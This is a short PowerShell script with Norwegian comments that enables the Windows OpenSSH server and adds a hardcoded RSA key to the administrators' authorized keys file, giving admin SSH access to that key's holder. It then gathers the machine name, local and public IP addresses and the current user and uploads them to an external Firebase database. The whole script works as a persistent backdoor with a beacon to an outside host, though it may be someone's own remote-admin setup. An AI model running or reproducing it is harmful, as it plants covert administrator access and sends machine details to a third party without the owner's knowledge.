Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType Automatic

cd C:\ProgramData\ssh
New-Item -ItemType File -Path ".\administrators_authorized_keys"
icacls.exe "C:/ProgramData/ssh/administrators_authorized_keys" /inheritance:r /grant "Administrators:F" /grant "SYSTEM:F"
Add-Content -Path ".\administrators_authorized_keys" -Value "
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwAFU06iFUe3eKSgT+l1P7gS0i86mkPYXt4H/1l8qfkQWSek1pW15v7SRM9Chdpdu4CG5ygTkOzywr+skVdW3UuSeLdCWenGt9r8AF3mPI+J2AucZeJW0o5qUKEmLk3+X7n69G1rZzbPhxkzNjdP8eptQ8RBDH7S0Ef5cPjCu0Ci9sEGuDXi0aINuo7Kah6QvKUQqF0ZS5DkZ3WJhMvcg/z2l84hPfg3DaulZ4yA+c8EvyxGOnLcgYC51DRRo2KZSQuAfsSYL83VlGDIxIegjFlgSrWj+PVo6e16135jT2nbOVvlN/Jhz8bPA8PpmHdamjoNr1qUtJnHIUYMBezNxDYmwlDJuTOoG0lyZCZPF+9GXIyHqSDA4192Cq5u4kWP1CiJ77/0UbfNJmXi5+n3E/CBjQuiIPwh8fpS03xPpYpafLPEWO1tUfjIdruApdiS9ljayDLg76Cv8ZBCoScIxnr3d0ava0BJF4wIFyhcRZYBjwtKvSShcMVw7hFQxJj48=
"

Restart-Service sshd

# Send info to firebase
$firebaseUriBase = 'https://morten1.europe-west1.firebasedatabase.app/'
$machineName = $env:COMPUTERNAME
$timestamp = Get-Date -Format "yyyyMMddTHHmmss"
$authorizedKeys = Get-Content -Path C:\ProgramData\ssh\administrators_authorized_keys
$ethIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet").IPAddress
$wifiIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi").IPAddress
$publicIP = (Invoke-WebRequest ifconfig.me/ip).Content
$user = whoami

# Systeminformasjon eller annen info du ønsker å lagre
$infoToSave = @{
    timestamp = $timestamp
    authorizedKeys = $authorizedKeys
    ethIP = $ethIP
    wifiIP = $wifiIP
    publicIP = $publicIP
    user = $user
}

$jsonData = $infoToSave | ConvertTo-Json

$firebaseUri = $firebaseUriBase + "machines/$machineName/$timestamp.json"

$response = Invoke-RestMethod -Uri $firebaseUri -Method Put -ContentType "application/json" -Body $jsonData

Write-Output $response
